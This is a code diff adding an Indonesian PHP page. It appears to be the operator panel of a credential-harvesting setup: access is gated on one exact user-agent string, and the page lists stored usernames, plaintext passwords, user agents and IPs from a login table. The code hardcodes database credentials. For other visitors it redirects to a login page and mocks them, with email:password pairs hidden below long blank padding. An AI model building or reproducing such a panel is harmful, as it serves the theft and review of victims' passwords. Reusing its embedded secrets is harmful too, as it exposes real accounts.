@@ -1,0 +1,130 @@
+<?php 
+$ua = $_SERVER["HTTP_USER_AGENT"];
+if($ua == "Mozilla/5.0 (Linux; Android 9; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36"
+ ):?>
+<html>
+<head>
+<style type="text/css">
+table{Border:1px solid green;
+cellpadding:1px;
+cellspacing:1px;
+border-collapse:collapse}
+tr,td{Border:1px solid white;
+padding:5px;
+font-size:10px;
+background-color:silver;
+color:black;}
+p{color:white}
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body style="background-color:black"><p>
+selamat datang,agus!<p>
+
+dashboard <p>
+<?php 
+$waktu = date("d - F - o");
+$jam = date("h : i : s");
+
+echo "$waktu [$jam]";
+?>
+</body>
+</html>
+
+<?php
+/*
+ mipc_27053797_apple
+ mipc_27053797
+ (Your vPanel Password)
+ sql105.mipropia.com
+*/
+
+$conn = mysqli_connect(
+"sql105.mipropia.com",
+"mipc_27053797",
+"rastafara354",
+"mipc_27053797_apple");
+
+$query = "SELECT * FROM login";
+$lemari = mysqli_query($conn,$query);
+$query2 = "SELECT * FROM Detail";
+$lemari2 = mysqli_query($conn,$query);
+
+?>
+<table>
+<tr>
+<td>id</td>
+<td>username</td>
+<td>password</td>
+<td>useragent</td>
+<td>ip</td>
+<td>waktu</td>
+</tr>
+<?php
+while($row = mysqli_fetch_assoc($lemari)):?>
+<tr>
+<td><?= $row["Id"];?></td>
+<td><?= $row["Username"];?></td>
+<td><?= $row["Password"];?></td>
+<td><?= $row["Useragent"];?></td>
+<td><a href="detail.php?ip=<?=$row['Ip']?>"><?= $row["Ip"];?></a></td>
+<td><?= $row["Waktu"];?></td>
+</tr>
+<?php endwhile;?>
+<table>
+<?php else:?>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="refresh" content="5;login.php">
+</head>
+<body>
+anda belum login,<p>
+saatnya anda kena genjutsu
+<pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</pre>
+agus@gmail.com:agus111
+menu@gmail.com:menu111
+endi@yahoo.com:endi111
+</body>
+</html>
+<?php endif;?>
